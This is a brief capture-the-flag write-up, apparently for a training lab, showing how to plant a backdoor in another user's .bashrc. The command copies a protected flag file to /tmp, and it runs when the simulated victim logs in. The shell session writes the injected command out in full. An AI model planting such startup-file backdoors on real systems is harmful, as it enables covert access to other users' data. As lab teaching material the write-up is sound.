### Challenge

To collect the flag, plant a command into `/home/zardus/.bashrc` that runs when `/challenge/victim` logs in, then run `/challenge/victim` and capture the output to retrieve the flag

### Thought Process

Firstly I'll have to add a command to zardus's `.bashrc` that will:
- Read the flag (zardus has permission)
- Make it accessible for me (the hacker user)
Then I need to run `/challenge/victim` which simulates the log in of zardus 

### Solution


```bash
hacker@shenanigans~bashrc-backdoor:~$ echo "cat /flag > /tmp/flag_output" >> /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ********
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:~$ cat /tmp/flag_output
```
